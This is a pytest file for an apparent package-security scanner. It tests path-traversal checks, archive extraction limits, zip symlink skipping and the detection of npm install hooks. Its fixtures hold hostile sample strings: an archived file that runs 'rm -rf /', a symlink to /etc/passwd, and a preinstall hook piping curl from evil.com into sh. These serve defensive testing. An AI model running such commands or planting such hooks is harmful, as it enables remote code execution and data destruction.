"""Tests for package ingesters."""

from __future__ import annotations

import io
import tarfile
import zipfile
from pathlib import Path

import pytest

from sentinel.ingester import (
    DownloadTooLargeError,
    ExtractionTooLargeError,
    PackageNotFoundError,
    PathTraversalError,
    get_ingester,
)
from sentinel.models import Ecosystem, IngestedPackage
from sentinel.pypi import PyPIIngester, _extract, _find_source_dir, _validate_path, _is_zip_symlink
from sentinel.npm import NpmIngester, _build_metadata, _extract_npm_tarball


# --- Model Tests ---


class TestIngestedPackage:
    def test_source_files_all(self, tmp_path: Path):
        (tmp_path / "main.py").write_text("print('hi')")
        (tmp_path / "util.js").write_text("console.log('hi')")
        sub = tmp_path / "sub"
        sub.mkdir()
        (sub / "nested.py").write_text("")

        pkg = IngestedPackage(
            name="test", version="1.0", ecosystem=Ecosystem.PYPI,
            source_dir=tmp_path, metadata={},
        )
        files = pkg.source_files()
        assert len(files) == 3

    def test_source_files_filtered(self, tmp_path: Path):
        (tmp_path / "main.py").write_text("")
        (tmp_path / "util.js").write_text("")
        (tmp_path / "readme.md").write_text("")

        pkg = IngestedPackage(
            name="test", version="1.0", ecosystem=Ecosystem.PYPI,
            source_dir=tmp_path, metadata={},
        )
        py_files = pkg.source_files(extensions={".py"})
        assert len(py_files) == 1
        assert py_files[0].name == "main.py"

    def test_context_manager(self, tmp_path: Path):
        from tempfile import TemporaryDirectory

        td = TemporaryDirectory(prefix="sentinel-test-")
        td_path = Path(td.name)
        assert td_path.exists()

        pkg = IngestedPackage(
            name="test", version="1.0", ecosystem=Ecosystem.PYPI,
            source_dir=td_path, metadata={}, _temp_dir=td,
        )
        with pkg:
            assert td_path.exists()
        assert not td_path.exists()


# --- Security Tests ---


class TestPathTraversal:
    def test_safe_path(self, tmp_path: Path):
        result = _validate_path("package/index.js", tmp_path)
        assert str(result).startswith(str(tmp_path.resolve()))

    def test_traversal_dotdot(self, tmp_path: Path):
        with pytest.raises(PathTraversalError):
            _validate_path("../../etc/passwd", tmp_path)

    def test_traversal_absolute(self, tmp_path: Path):
        with pytest.raises(PathTraversalError):
            _validate_path("/etc/passwd", tmp_path)


class TestTarExtraction:
    def _make_tar_gz(self, members: dict[str, bytes]) -> bytes:
        """Create a .tar.gz in memory with given members."""
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tf:
            for name, content in members.items():
                info = tarfile.TarInfo(name=name)
                info.size = len(content)
                tf.addfile(info, io.BytesIO(content))
        return buf.getvalue()

    def test_normal_extraction(self, tmp_path: Path):
        archive = self._make_tar_gz({
            "pkg/main.py": b"print('hello')",
            "pkg/util.py": b"x = 1",
        })
        _extract(archive, "test.tar.gz", tmp_path)
        assert (tmp_path / "pkg" / "main.py").read_text() == "print('hello')"

    def test_traversal_blocked(self, tmp_path: Path):
        archive = self._make_tar_gz({
            "../../evil.py": b"import os; os.system('rm -rf /')",
        })
        with pytest.raises(PathTraversalError):
            _extract(archive, "test.tar.gz", tmp_path)

    def test_decompression_bomb(self, tmp_path: Path):
        # Create archive with content that exceeds MAX_EXTRACTED_BYTES
        from sentinel.ingester import MAX_EXTRACTED_BYTES
        archive = self._make_tar_gz({
            "big.bin": b"A" * (MAX_EXTRACTED_BYTES + 1),
        })
        with pytest.raises(ExtractionTooLargeError):
            _extract(archive, "test.tar.gz", tmp_path)


class TestZipExtraction:
    def _make_zip(self, members: dict[str, bytes]) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            for name, content in members.items():
                zf.writestr(name, content)
        return buf.getvalue()

    def _make_zip_with_symlink(self, real_file: str, real_content: bytes, link_name: str, link_target: str) -> bytes:
        """Create a zip with a symlink entry."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            zf.writestr(real_file, real_content)
            # Create a symlink entry
            info = zipfile.ZipInfo(link_name)
            # Set Unix symlink mode: 0o120000 (symlink) | 0o777 (permissions)
            info.external_attr = (0o120777) << 16
            zf.writestr(info, link_target.encode())
        return buf.getvalue()

    def test_normal_extraction(self, tmp_path: Path):
        archive = self._make_zip({
            "pkg/main.py": b"print('hello')",
        })
        _extract(archive, "test.zip", tmp_path)
        assert (tmp_path / "pkg" / "main.py").read_text() == "print('hello')"

    def test_traversal_blocked(self, tmp_path: Path):
        archive = self._make_zip({
            "../../evil.py": b"bad",
        })
        with pytest.raises(PathTraversalError):
            _extract(archive, "test.zip", tmp_path)

    def test_symlink_skipped(self, tmp_path: Path):
        """Symlinks in zip archives are silently skipped during extraction."""
        archive = self._make_zip_with_symlink(
            real_file="pkg/main.py",
            real_content=b"print('hello')",
            link_name="pkg/evil_link",
            link_target="/etc/passwd",
        )
        _extract(archive, "test.zip", tmp_path)
        # Real file extracted
        assert (tmp_path / "pkg" / "main.py").exists()
        # Symlink was skipped
        assert not (tmp_path / "pkg" / "evil_link").exists()


# --- npm Metadata Tests ---


class TestNpmMetadata:
    def test_postinstall_surfaced(self):
        version_data = {
            "description": "test pkg",
            "scripts": {
                "build": "tsc",
                "postinstall": "node malicious.js",
                "test": "jest",
            },
            "dependencies": {"lodash": "^4.0.0"},
        }
        meta = _build_metadata(version_data)
        assert meta["postinstall"] == "node malicious.js"
        assert meta["preinstall"] is None
        assert meta["install"] is None

    def test_no_scripts(self):
        version_data = {"description": "clean pkg"}
        meta = _build_metadata(version_data)
        assert meta["postinstall"] is None
        assert meta["preinstall"] is None
        assert meta["scripts"] == {}

    def test_preinstall_surfaced(self):
        version_data = {
            "scripts": {
                "preinstall": "curl http://evil.com | sh",
            },
        }
        meta = _build_metadata(version_data)
        assert meta["preinstall"] == "curl http://evil.com | sh"
        assert meta["postinstall"] is None


# --- Factory Tests ---


class TestGetIngester:
    def test_pypi(self):
        ingester = get_ingester(Ecosystem.PYPI)
        assert isinstance(ingester, PyPIIngester)

    def test_npm(self):
        ingester = get_ingester(Ecosystem.NPM)
        assert isinstance(ingester, NpmIngester)


# --- Source Dir Detection ---


class TestFindSourceDir:
    def test_single_subdir(self, tmp_path: Path):
        pkg_dir = tmp_path / "requests-2.31.0"
        pkg_dir.mkdir()
        (pkg_dir / "setup.py").write_text("")
        assert _find_source_dir(tmp_path) == pkg_dir

    def test_multiple_entries(self, tmp_path: Path):
        (tmp_path / "file1.py").write_text("")
        (tmp_path / "file2.py").write_text("")
        assert _find_source_dir(tmp_path) == tmp_path

    def test_empty(self, tmp_path: Path):
        assert _find_source_dir(tmp_path) == tmp_path
